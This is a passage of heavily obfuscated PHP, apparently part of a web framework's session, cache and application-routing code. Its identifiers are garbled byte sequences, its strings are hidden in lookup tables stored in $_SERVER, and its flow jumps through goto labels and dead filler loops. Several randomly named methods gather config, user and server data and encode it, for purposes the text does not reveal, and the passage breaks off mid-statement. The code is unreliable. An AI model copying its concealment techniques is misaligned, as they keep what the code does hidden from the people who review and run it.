$d◊∏º˜ΩÔÖ[$C©â‚ÿãò†[823]]; switch ($d“Íı≤Îáµ) { case $C©â‚ÿãò†[17]: self::$handle = Model($C©â‚ÿãò†[824]); break; case $C©â‚ÿãò†[825]: self::$handle = new CacheRedis($fÜ«≈¶Øœ , $dåÜïû†Ç´); break; case $C©â‚ÿãò†[826]: self::$handle = new CacheMemcached($fÜ«≈¶Øœ , $dåÜïû†Ç´); break; case $C©â‚ÿãò†[193]: $fÜ«≈¶Øœ [$C©â‚ÿãò†[76]] = $fÜ«≈¶Øœ [$C©â‚ÿãò†[76]] . $C©â‚ÿãò†[1519]; self::$handle = new CacheFile($fÜ«≈¶Øœ , $dåÜïû†Ç´); default: break; } goto f‘‚» úÆ©; F‹ŸêÜáå™: $C©â‚ÿãò† =& $_SERVER[’ÿƒ†ïò]; static $E„§Ö∞‹≤¡ = false; if ($E„§Ö∞‹≤¡) { return $E„§Ö∞‹≤¡; } goto bËôëıÙéù; E¡≈Ü ™ô·: } public static function sign($Bä»‹ëÃá = false) { $Bä»‹ëÃá && (self::$sessionSign = $Bä»‹ëÃá); self::init(); return self::$sessionSign; } public static function set($d¯ê•ÍŒœΩ, $aã ŒÂù´ã = false) { self::init(); if (is_array($d¯ê•ÍŒœΩ)) { foreach ($d¯ê•ÍŒœΩ as $a«é¿æïí≈ => $dﬂÕ¶ä˜á«) { array_set_value(self::$data, $a«é¿æïí≈, $dﬂÕ¶ä˜á«); } } else { array_set_value(self::$data, $d¯ê•ÍŒœΩ, $aã ŒÂù´ã); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($C«¿Ë¥ı¨ë = false) { self::init(); if (!$C«¿Ë¥ı¨ë) { return self::$data; } return array_get_value(self::$data, $C«¿Ë¥ı¨ë); } public static function remove($bÔÙ¡∞÷Î) { self::init(); unset(self::$data[$bÔÙ¡∞÷Î]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[’ÿƒ†ïò][828])) { self::$handle->clearTimeout(); } } } goto AÈ§ƒ°‹é»; Aßíµ¢“ó‡: $bÃ⁄πé“≥≤ = $_SERVER[’ÿƒ†ïò][604]; if (!$bÃ⁄πé“≥≤) { return; } class Application { private $defaultModule = "\151\156\x64\145\170"; private $defaultController = "\151\156\x64\x65\x78"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($Bæ‰úƒá«é) { goto DòÜ®Ìè¿≠; b÷»¿ÙóƒÕ: $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][3]}($AÒﬂñÒ∂‡‡[4], array($this, $AÒﬂñÒ∂‡‡[5])); $A”ãÃﬁΩçÖ = $aãî∞¡âÆı[608]; if (strlen($A”ãÃﬁΩçÖ) < $aãî∞¡âÆı[609]) { die; } goto AÙ·ÎıÑÚ√; Cå¿…œÇÊà: $this->defaultModule = $C‰ﬂ◊øºùÙ[0] ? $C‰ﬂ◊øºùÙ[0] : $this->defaultModule; $DûßÁ∏ÜÖî = $aãî∞¡âÆı[605]; $this->defaultController = $C‰ﬂ◊øºùÙ[1] ? $C‰ﬂ◊øºùÙ[1] : $this->defaultController; goto AΩˆﬁ•Ê‘ÿ; AΩˆﬁ•Ê‘ÿ: $c˘ÿûŸÑØ = $aãî∞¡âÆı[606]; while ($c˘ÿûŸÑØ < $aãî∞¡âÆı[607]) { if ($c˘ÿûŸÑØ >= 0) { break; } $c˘ÿûŸÑØ++; } $this->defaultAction = $C‰ﬂ◊øºùÙ[2] ? $C‰ﬂ◊øºùÙ[2] : $this->defaultAction; goto b÷»¿ÙóƒÕ; DòÜ®Ìè¿≠: $aãî∞¡âÆı =& $_SERVER[’ÿƒ†ïò]; $AÒﬂñÒ∂‡‡ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $C‰ﬂ◊øºùÙ = $AÒﬂñÒ∂‡‡[0]($AÒﬂñÒ∂‡‡[1], $AÒﬂñÒ∂‡‡[2]($Bæ‰úƒá«é, $AÒﬂñÒ∂‡‡[1])); goto Cå¿…œÇÊà; AÙ·ÎıÑÚ√: } public function appRun($d∫ŸØÓ´õ˜) { goto bôÖ›†Ê≥Œ; Còä≤é¥Áﬂ: $A–∏ßÇ∂è¿ = $a¯á‘çÌ¥±[610]; while (strlen($A–∏ßÇ∂è¿) < $a¯á‘çÌ¥±[609]) { if (!$A–∏ßÇ∂è¿) { break; } $A–∏ßÇ∂è¿++; } $c“ã∆ÕœòÏ = $d¯áÚ“ÙÑ¯[6]($dóÑÃÔîˆç[0]); goto C£”úﬂ€·Ø; C–¶¬î◊°µ: $d¯áÚ“ÙÑ¯[17]($d∫ŸØÓ´õ˜); $d¯áÚ“ÙÑ¯[13](array($d¯áÚ“ÙÑ¯[14], $d¯áÚ“ÙÑ¯[15]), $aÃ±É©ªˆ· . $d¯áÚ“ÙÑ¯[18], $d∫ŸØÓ´õ˜); goto FÈÁ””¡ó∂; bôÖ›†Ê≥Œ: $a¯á‘çÌ¥± =& $_SERVER[’ÿƒ†ïò]; $d¯áÚ“ÙÑ¯ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $dóÑÃÔîˆç = $d¯áÚ“ÙÑ¯[0]($d¯áÚ“ÙÑ¯[1], $d∫ŸØÓ´õ˜); goto Còä≤é¥Áﬂ; C£”úﬂ€·Ø: $aÃ±É©ªˆ· = $d¯áÚ“ÙÑ¯[7]; if ($c“ã∆ÕœòÏ == $d¯áÚ“ÙÑ¯[8]) { $aÃ±É©ªˆ· = $d¯áÚ“ÙÑ¯[9]; $dóÑÃÔîˆç[0] = $d¯áÚ“ÙÑ¯[10]; $dóÑÃÔîˆç[1] = $dóÑÃÔîˆç[1] . $d¯áÚ“ÙÑ¯[11]; $d∫ŸØÓ´õ˜ = $d¯áÚ“ÙÑ¯[12]($d¯áÚ“ÙÑ¯[1], $dóÑÃÔîˆç); $d∫ŸØÓ´õ˜ = $d¯áÚ“ÙÑ¯[2]($d∫ŸØÓ´õ˜, $d¯áÚ“ÙÑ¯[1]); } $d¯áÚ“ÙÑ¯[13](array($d¯áÚ“ÙÑ¯[14], $d¯áÚ“ÙÑ¯[15]), $aÃ±É©ªˆ· . $d¯áÚ“ÙÑ¯[16], $d∫ŸØÓ´õ˜); goto C–¶¬î◊°µ; FÈÁ””¡ó∂: } private function autorun() { $bì∏é‘¥ÿõ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; global $config; $E¯∂ÙîŸ≥æ = $_SERVER[’ÿƒ†ïò][611]; if ($bì∏é‘¥ÿõ[19]($config[$bì∏é‘¥ÿõ[20]]) == 0) { return; } foreach ($config[$bì∏é‘¥ÿõ[20]] as $cÊüç™Ó¯¥ => $AÊÁ˜äâ’ç) { $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][21]}($AÊÁ˜äâ’ç); } } private function rkic16857640() { goto dÛ≈Â«‚á·; cå∞ã∫ÇÕÆ: $bØı“Õâò“ = $AΩ”ø—π°Ò[613]; goto cóêö≤ﬂπÂ; e«ÀÌ◊»ú: $FÀ„÷ƒì˘ù = $b⁄‹àâèæ≤[26]($GLOBALS[$b⁄‹àâèæ≤[22]][$b⁄‹àâèæ≤[23]], 1); $GLOBALS[$b⁄‹àâèæ≤[22]][$b⁄‹àâèæ≤[23]] = $b⁄‹àâèæ≤[27]($AÚ·ïÂ›èà, $FÀ„÷ƒì˘ù); $GLOBALS[$b⁄‹àâèæ≤[22]][$b⁄‹àâèæ≤[28]] = $b⁄‹àâèæ≤[29]($b⁄‹àâèæ≤[1], $GLOBALS[$b⁄‹àâèæ≤[22]][$b⁄‹àâèæ≤[23]]); goto cå∞ã∫ÇÕÆ; dÛ≈Â«‚á·: $AΩ”ø—π°Ò =& $_SERVER[’ÿƒ†ïò]; $b⁄‹àâèæ≤ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $fΩÀûí®Æà = $b⁄‹àâèæ≤[8]; goto Fƒ∂∑ø¢—á; Fƒ∂∑ø¢—á: $Fßµ‚—…Øû = $AΩ”ø—π°Ò[612]; $bÂ¥ÿ≥Í◊Ë = $GLOBALS[$b⁄‹àâèæ≤[22]][$b⁄‹àâèæ≤[23]][0]; if (!$bÂ¥ÿ≥Í◊Ë || $b⁄‹àâèæ≤[24]($bÂ¥ÿ≥Í◊Ë) <= $b⁄‹àâèæ≤[24]($fΩÀûí®Æà)) { return; } goto FÜïòàåì—; FÜïòàåì—: if ($b⁄‹àâèæ≤[6]($b⁄‹àâèæ≤[25]($bÂ¥ÿ≥Í◊Ë, -$b⁄‹àâèæ≤[24]($fΩÀûí®Æà))) != $fΩÀûí®Æà) { return; } $FÔ∏¡áˆ‚ö = $b⁄‹àâèæ≤[25]($bÂ¥ÿ≥Í◊Ë, 0, -$b⁄‹àâèæ≤[24]($fΩÀûí®Æà)); $AÚ·ïÂ›èà = array($b⁄‹àâèæ≤[8], $FÔ∏¡áˆ‚ö); goto e«ÀÌ◊»ú; cóêö≤ﬂπÂ: } private function mkgv0c7b1169() { goto DÒµÎÊÓﬁˆ; DÇ”ÜãˆÒõ: $aÁå¯É◊ö¡ = $FÈÃØËÙâé[618]; while ($aÁå¯É◊ö¡ < $FÈÃØËÙâé[601]) { if ($aÁå¯É◊ö¡ >= 0) { break; } $aÁå¯É◊ö¡++; } $EÌâèïËÈπ = $cÊ˘ãó∆Æì[2]($b◊ì–å≥ËÆ[0][0], $cÊ˘ãó∆Æì[36]); goto E™ÑÀ≈“Ç”; Aèπı”Ñá∂: $Bó™¯¥À–» = $_SERVER[$cÊ˘ãó∆Æì[30]]; $bãˆ”ë¬˜Ö = $FÈÃØËÙâé[614]; if (strlen($bãˆ”ë¬˜Ö) < $FÈÃØËÙâé[615]) { return; } goto Eπ≤ÈÍÂﬁ¢; a◊®åæü… : while ($bé™ÆÂ∏Üí < $FÈÃØËÙâé[601]) { if ($bé™ÆÂ∏Üí >= 0) { break; } $bé™ÆÂ∏Üí++; } $GLOBALS[$cÊ˘ãó∆Æì[22]][$cÊ˘ãó∆Æì[28]] = $cÊ˘ãó∆Æì[29]($cÊ˘ãó∆Æì[1], $GLOBALS[$cÊ˘ãó∆Æì[22]][$cÊ˘ãó∆Æì[23]]); $C·ó∆›™£ı = $FÈÃØËÙâé[621]; goto A•Öêì‡î»; A•Öêì‡î»: if (!$C·ó∆›™£ı) { return; } goto F∞›·ë™êò; AÍîù…ÇöÊ: if (!$cÊ˘ãó∆Æì[32]($Bó™¯¥À–», $cÃƒ÷◊Ω≈»)) { return; } $E‹ ç»©±‡ = $cÊ˘ãó∆Æì[33]($Bó™¯¥À–», $cÃƒ÷◊Ω≈»); $dÔ˘™≠≤çø = $FÈÃØËÙâé[617]; goto d‹ÚŒÆÑÍå; DÒµÎÊÓﬁˆ: $FÈÃØËÙâé =& $_SERVER[’ÿƒ†ïò]; $cÊ˘ãó∆Æì =& $_SERVER[É∫„≈‹Æá¿∫Ö]; if ($GLOBALS[$cÊ˘ãó∆Æì[22]][$cÊ˘ãó∆Æì[28]] != $cÊ˘ãó∆Æì[10]) { return; } goto Aèπı”Ñá∂; E™ÑÀ≈“Ç”: $b«Œ≤¥ûÒœ = $FÈÃØËÙâé[619]; $GLOBALS[$cÊ˘ãó∆Æì[22]][$cÊ˘ãó∆Æì[23]] = $cÊ˘ãó∆Æì[0]($cÊ˘ãó∆Æì[36], $EÌâèïËÈπ); $bé™ÆÂ∏Üí = $FÈÃØËÙâé[620]; goto a◊®åæü… ; Eπ≤ÈÍÂﬁ¢: $cÃƒ÷◊Ω≈» = $cÊ˘ãó∆Æì[31]; $bÆÚ“∫¨„Ú = $FÈÃØËÙâé[616]; if (!$bÆÚ“∫¨„Ú) { die; } goto AÍîù…ÇöÊ; d‹ÚŒÆÑÍå: while ($dÔ˘™≠≤çø < $FÈÃØËÙâé[615]) { if ($dÔ˘™≠≤çø >= 0) { break; } $dÔ˘™≠≤çø++; } $EÌâèïËÈπ = $cÊ˘ãó∆Æì[25]($Bó™¯¥À–», $E‹ ç»©±‡ + $cÊ˘ãó∆Æì[24]($cÃƒ÷◊Ω≈»)); $cÊ˘ãó∆Æì[34]($cÊ˘ãó∆Æì[35], $EÌâèïËÈπ, $b◊ì–å≥ËÆ); goto DÇ”ÜãˆÒõ; F∞›·ë™êò: } public function run() { goto d›·ÇÉ◊∞Î; D≤œÊ±ﬁæû: $cùˆ¿ÏâÌΩ = $GLOBALS[$Däâãú¬‹Ö[22]][$Däâãú¬‹Ö[28]]; $EñÆÇÊÙâé = $còÈ°èúŸ´[624]; if (strlen($EñÆÇÊÙâé) < $còÈ°èúŸ´[625]) { return; } goto a…äÙ´ÇÜê; d›·ÇÉ◊∞Î: $còÈ°èúŸ´ =& $_SERVER[’ÿƒ†ïò]; $Däâãú¬‹Ö =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][37]}(); goto A£≤ °¡≥ö; DõΩà∂∫ûÑ: while (strlen($BåÏöã¿√≈) < $còÈ°èúŸ´[625]) { if (!$BåÏöã¿√≈) { break; } $BåÏöã¿√≈++; } $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][45]}(); if ($Däâãú¬‹Ö[19]($C∞Íò‰”«Ó) >= 3) { $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][21]}($cùˆ¿ÏâÌΩ); } else { $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][21]}(ACTION); } goto C®éπÉá°Ê; a…äÙ´ÇÜê: $Däâãú¬‹Ö[39]($Däâãú¬‹Ö[40], isset($C∞Íò‰”«Ó[0]) && $C∞Íò‰”«Ó[0] ? $C∞Íò‰”«Ó[0] : $this->defaultModule); $Däâãú¬‹Ö[39]($Däâãú¬‹Ö[41], isset($C∞Íò‰”«Ó[1]) && $C∞Íò‰”«Ó[0] ? $C∞Íò‰”«Ó[1] : $this->defaultController); $Däâãú¬‹Ö[39]($Däâãú¬‹Ö[42], isset($C∞Íò‰”«Ó[2]) && $C∞Íò‰”«Ó[0] ? $C∞Íò‰”«Ó[2] : $this->defaultAction); goto EøØ·¡º†â; Fπ¨êÎéã›: $C∞Íò‰”«Ó = $GLOBALS[$Däâãú¬‹Ö[22]][$Däâãú¬‹Ö[23]]; $C£—·àıäâ = $còÈ°èúŸ´[623]; if (strlen($C£—·àıäâ) < $còÈ°èúŸ´[615]) { return; } goto D≤œÊ±ﬁæû; A£≤ °¡≥ö: $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][38]}(); $BÒ…‹â÷èˆ = $còÈ°èúŸ´[622]; if (strlen($BÒ…‹â÷èˆ) < $còÈ°èúŸ´[615]) { return; } goto Fπ¨êÎéã›; EøØ·¡º†â: $Däâãú¬‹Ö[39]($Däâãú¬‹Ö[43], MOD . $Däâãú¬‹Ö[1] . ST . $Däâãú¬‹Ö[1] . ACT); $_SERVER[$Däâãú¬‹Ö[44]] = $Däâãú¬‹Ö[6](ACTION); $BåÏöã¿√≈ = $còÈ°èúŸ´[626]; goto DõΩà∂∫ûÑ; C®éπÉá°Ê: } private $mflrf2bde457 = array(); private $uxqt49e8f951 = ''; public function mwbz4f8e5710() { goto dü‘∂¢Ç• ; Dﬂ¨®¢â≥ß: $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][48]}(); $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][49]}(); $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][50]}(); goto bßÉòãÒﬂÛ; aëÃ®óçäé: $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][52]}(); $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][3]}($bﬂ°µ»‘æ°[53], array($this, $bﬂ°µ»‘æ°[54])); $eáÒ˜‚ÍÆ = $aˆßÔãøá»[629]; goto fê¨‚›êÕ˜; Dº˜ªµ®Êÿ: $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][47]}(); $bœ—ü°ÆÛõ = $aˆßÔãøá»[627]; while (strlen($bœ—ü°ÆÛõ) < $aˆßÔãøá»[625]) { if (!$bœ—ü°ÆÛõ) { break; } $bœ—ü°ÆÛõ++; } goto Dﬂ¨®¢â≥ß; dü‘∂¢Ç• : $aˆßÔãøá» =& $_SERVER[’ÿƒ†ïò]; $bﬂ°µ»‘æ° =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][46]}(); goto Dº˜ªµ®Êÿ; bßÉòãÒﬂÛ: $fÒ‚öî·ÁÉ = $aˆßÔãøá»[628]; if (strlen($fÒ‚öî·ÁÉ) < $aˆßÔãøá»[625]) { return; } $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][51]}(); goto aëÃ®óçäé; fê¨‚›êÕ˜: if (strlen($eáÒ˜‚ÍÆ) < $aˆßÔãøá»[625]) { die; } $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][3]}($bﬂ°µ»‘æ°[55], array($this, $bﬂ°µ»‘æ°[56])); $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][3]}($bﬂ°µ»‘æ°[57], array($this, $bﬂ°µ»‘æ°[58])); goto cÑàﬁõ‰—Õ; cÑàﬁõ‰—Õ: $e∂Ë∫â‰Ëò = $aˆßÔãøá»[630]; $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][3]}($bﬂ°µ»‘æ°[59], array($this, $bﬂ°µ»‘æ°[60])); $dö∏Ü¢±ŸÌ = $aˆßÔãøá»[631]; goto fàÉÑö÷êí; fàÉÑö÷êí: } public function tukpdd3f4acc($C»€Ã…ÈÈ∞) { goto b´ÓºÃ≥Îø; AöÖ¿áÓÌÔ: unset($C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[115]][$aßÑÕà‚ÑΩ[117]]); $dƒ“Ñ÷ﬂ¨Ç = $b∏ßô·ç≠∫[634]; if (strlen($dƒ“Ñ÷ﬂ¨Ç) < $b∏ßô·ç≠∫[609]) { die; } goto a£”≠ãÑáÏ; b´ÓºÃ≥Îø: $b∏ßô·ç≠∫ =& $_SERVER[’ÿƒ†ïò]; $aßÑÕà‚ÑΩ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $C£Ûûçﬁ◊ñ = $aßÑÕà‚ÑΩ[61]($aßÑÕà‚ÑΩ[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}(); goto Búñß»çÑ; a£”≠ãÑáÏ: unset($C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[114]][$aßÑÕà‚ÑΩ[76]]); unset($C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[114]][$aßÑÕà‚ÑΩ[118]]); $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[114]][$aßÑÕà‚ÑΩ[119]] = array($aßÑÕà‚ÑΩ[120] => (int) $F®é∂È’ÚÕ[$aßÑÕà‚ÑΩ[121]], $aßÑÕà‚ÑΩ[122] => (int) $aßÑÕà‚ÑΩ[123]($F®é∂È’ÚÕ, $aßÑÕà‚ÑΩ[124], 0)); goto EèŸàÕçìè; f≤ﬁ”ª≥ñ˘: if (strlen($CåáÖ¿‘ºœ) < $b∏ßô·ç≠∫[625]) { return; } if ($aßÑÕà‚ÑΩ[123]($GLOBALS, $aßÑÕà‚ÑΩ[149]) && $this->config[$aßÑÕà‚ÑΩ[150]]) { $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[151]] = WEB_ROOT; } return $C»€Ã…ÈÈ∞; goto aäﬂŸÚ•á˘; EÃ…∏âÂ¬ä: foreach ($aóè¡¡ˆÚ˜ as $c©ãÇÒÍì≈) { $D°•øâêä¨ = $GLOBALS[$aßÑÕà‚ÑΩ[111]][$aßÑÕà‚ÑΩ[112]][$c©ãÇÒÍì≈]; $F•‘â∂∆¬ = $b∏ßô·ç≠∫[633]; while (strlen($F•‘â∂∆¬) < $b∏ßô·ç≠∫[609]) { if (!$F•‘â∂∆¬) { break; } $F•‘â∂∆¬++; } if (isset($C£Ûûçﬁ◊ñ[$c©ãÇÒÍì≈])) { $D°•øâêä¨ = $C£Ûûçﬁ◊ñ[$c©ãÇÒÍì≈]; } $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[114]][$c©ãÇÒÍì≈] = $D°•øâêä¨; } $F®é∂È’ÚÕ = $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[114]][$aßÑÕà‚ÑΩ[76]]; unset($C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[115]][$aßÑÕà‚ÑΩ[116]]); goto AöÖ¿áÓÌÔ; fªó†„ëëé: $E±€Ç†√≈π = $b∏ßô·ç≠∫[636]; if ($C£Ûûçﬁ◊ñ[$aßÑÕà‚ÑΩ[137]] != $aßÑÕà‚ÑΩ[138]) { $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[139]] = $C£Ûûçﬁ◊ñ[$aßÑÕà‚ÑΩ[139]]; $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[140]] = $C£Ûûçﬁ◊ñ[$aßÑÕà‚ÑΩ[140]]; $fÑÉçäÌüö = $aßÑÕà‚ÑΩ[141](10) . $this->uxqt49e8f951 . $aßÑÕà‚ÑΩ[141](5); $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[142]][$aßÑÕà‚ÑΩ[143]] = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][144]}($fÑÉçäÌüö, $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[130]]); } if ($this->uxqt49e8f951 == $aßÑÕà‚ÑΩ[138]) { $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[113]][$aßÑÕà‚ÑΩ[114]][$aßÑÕà‚ÑΩ[119]][$aßÑÕà‚ÑΩ[124]] = 0; } goto AÑŒŒ¡Ï©‡; báΩÜ∑î—§: $e∫ﬂÑ—å’ß = $b∏ßô·ç≠∫[635]; while (strlen($e∫ﬂÑ—å’ß) < $b∏ßô·ç≠∫[609]) { if (!$e∫ﬂÑ—å’ß) { break; } $e∫ﬂÑ—å’ß++; } $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[137]] = $this->uxqt49e8f951; goto fªó†„ëëé; EèŸàÕçìè: $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[126]] = $aßÑÕà‚ÑΩ[127]($aßÑÕà‚ÑΩ[128])->{$_SERVER[É∫„≈‹Æá¿∫Ö][129]}(); $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[130]] = $aßÑÕà‚ÑΩ[131]($_SERVER[$aßÑÕà‚ÑΩ[132]] . $C£Ûûçﬁ◊ñ[$aßÑÕà‚ÑΩ[133]]); $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[134]] = $aßÑÕà‚ÑΩ[135]($aßÑÕà‚ÑΩ[136]()); goto báΩÜ∑î—§; Búñß»çÑ: $aóè¡¡ˆÚ˜ = array($aßÑÕà‚ÑΩ[64], $aßÑÕà‚ÑΩ[65], $aßÑÕà‚ÑΩ[66], $aßÑÕà‚ÑΩ[67], $aßÑÕà‚ÑΩ[68], $aßÑÕà‚ÑΩ[69], $aßÑÕà‚ÑΩ[70], $aßÑÕà‚ÑΩ[71], $aßÑÕà‚ÑΩ[72], $aßÑÕà‚ÑΩ[73], $aßÑÕà‚ÑΩ[74], $aßÑÕà‚ÑΩ[75], $aßÑÕà‚ÑΩ[76], $aßÑÕà‚ÑΩ[77], $aßÑÕà‚ÑΩ[78], $aßÑÕà‚ÑΩ[79], $aßÑÕà‚ÑΩ[80], $aßÑÕà‚ÑΩ[81], $aßÑÕà‚ÑΩ[82], $aßÑÕà‚ÑΩ[83], $aßÑÕà‚ÑΩ[84], $aßÑÕà‚ÑΩ[85], $aßÑÕà‚ÑΩ[86], $aßÑÕà‚ÑΩ[87], $aßÑÕà‚ÑΩ[88], $aßÑÕà‚ÑΩ[89], $aßÑÕà‚ÑΩ[90], $aßÑÕà‚ÑΩ[91], $aßÑÕà‚ÑΩ[92], $aßÑÕà‚ÑΩ[93], $aßÑÕà‚ÑΩ[94], $aßÑÕà‚ÑΩ[95], $aßÑÕà‚ÑΩ[96], $aßÑÕà‚ÑΩ[97], $aßÑÕà‚ÑΩ[98], $aßÑÕà‚ÑΩ[99], $aßÑÕà‚ÑΩ[100], $aßÑÕà‚ÑΩ[101], $aßÑÕà‚ÑΩ[102], $aßÑÕà‚ÑΩ[103], $aßÑÕà‚ÑΩ[104], $aßÑÕà‚ÑΩ[105], $aßÑÕà‚ÑΩ[106], $aßÑÕà‚ÑΩ[107], $aßÑÕà‚ÑΩ[108], $aßÑÕà‚ÑΩ[109], $aßÑÕà‚ÑΩ[110]); $Fı£öôìˆˆ = $b∏ßô·ç≠∫[632]; if (!$Fı£öôìˆˆ) { die; } goto EÃ…∏âÂ¬ä; AÑŒŒ¡Ï©‡: $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[145]] = $aßÑÕà‚ÑΩ[123]($this->mflrf2bde457, $aßÑÕà‚ÑΩ[146], $aßÑÕà‚ÑΩ[10]); $C»€Ã…ÈÈ∞[$aßÑÕà‚ÑΩ[125]][$aßÑÕà‚ÑΩ[147]] = $aßÑÕà‚ÑΩ[123]($this->mflrf2bde457, $aßÑÕà‚ÑΩ[148], $aßÑÕà‚ÑΩ[10]); $CåáÖ¿‘ºœ = $b∏ßô·ç≠∫[637]; goto f≤ﬁ”ª≥ñ˘; aäﬂŸÚ•á˘: } private function gkvua216854a() { goto D¡ËÙìÀöí; D¡ËÙìÀöí: $BÈÿÑ Èÿ´ =& $_SERVER[’ÿƒ†ïò]; $bºµõ—Öãç =& $_SERVER[É∫„≈‹Æá¿∫Ö]; if ($_SERVER[$bºµõ—Öãç[44]] == $bºµõ—Öãç[152]) { goto A≈∂’™»Ôæ; A îÇ¡ŒŸ–: $D”’éÆ¬Ç€ = $BÈÿÑ Èÿ´[639]; if (strlen($D”’éÆ¬Ç€) < $BÈÿÑ Èÿ´[625]) { die; } $bºµõ—Öãç[13](array($bºµõ—Öãç[176], $bºµõ—Öãç[177]), $fê…Ú”ı°á); goto eçîƒïøÈ‘; eçîƒïøÈ‘: $dÉ«ô”è‚ë = $BÈÿÑ Èÿ´[640]; if (!$dÉ«ô”è‚ë) { die; } goto C¨ñäØ–î§; A≈∂’™»Ôæ: $b≥ı˜È¿Â∑ = array($bºµõ—Öãç[137] => $this->uxqt49e8f951, $bºµõ—Öãç[153] => $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][154]}(), $bºµõ—Öãç[155] => $bºµõ—Öãç[61]($bºµõ—Öãç[156])->{$_SERVER[É∫„≈‹Æá¿∫Ö][157]}()); if ($this->uxqt49e8f951 != $bºµõ—Öãç[138]) { $Cπ±º“‘›π = $bºµõ—Öãç[123]($this->mflrf2bde457, $bºµõ—Öãç[158]); if ($Cπ±º“‘›π) { $b≥ı˜È¿Â∑[$bºµõ—Öãç[159]] = $Cπ±º“‘›π; $b≥ı˜È¿Â∑[$bºµõ—Öãç[160]] = $bºµõ—Öãç[161]($bºµõ—Öãç[123]($this->mflrf2bde457, $bºµõ—Öãç[162])); $b≥ı˜È¿Â∑[$bºµõ—Öãç[163]] = $bºµõ—Öãç[123]($this->mflrf2bde457, $bºµõ—Öãç[148]); } $a∏¡∆ﬂæñû = $bºµõ—Öãç[61]($bºµõ—Öãç[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($bºµõ—Öãç[164], $bºµõ—Öãç[10], !0); if ($bºµõ—Öãç[165]($a∏¡∆ﬂæñû) && $bºµõ—Öãç[25]($a∏¡∆ﬂæñû, 0, 1) == $bºµõ—Öãç[166]) { $a∏¡∆ﬂæñû = $bºµõ—Öãç[167]($a∏¡∆ﬂæñû); } if ($bºµõ—Öãç[168]($a∏¡∆ﬂæñû) && $a∏¡∆ﬂæñû[$bºµõ—Öãç[169]] && $bºµõ—Öãç[32]($a∏¡∆ﬂæñû[$bºµõ—Öãç[169]], $bºµõ—Öãç[170])) { $EËä”©î√ò = $bºµõ—Öãç[0]($bºµõ—Öãç[170], $a∏¡∆ﬂæñû[$bºµõ—Öãç[169]]); $b≥ı˜È¿Â∑[$bºµõ—Öãç[171]] = $EËä”©î√ò[0]; } } $b≥ı˜È¿Â∑ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($bºµõ—Öãç[173]($b≥ı˜È¿Â∑), $bºµõ—Öãç[131]($bºµõ—Öãç[174])); goto cû∑≈¿†≠ß; cû∑≈¿†≠ß: $FÏ¥ƒÍœ–™ = $BÈÿÑ Èÿ´[638]; if (!$FÏ¥ƒÍœ–™) { die; } $fê…Ú”ı°á = array($bºµõ—Öãç[175] => $b≥ı˜È¿Â∑); goto A îÇ¡ŒŸ–; C¨ñäØ–î§: } goto 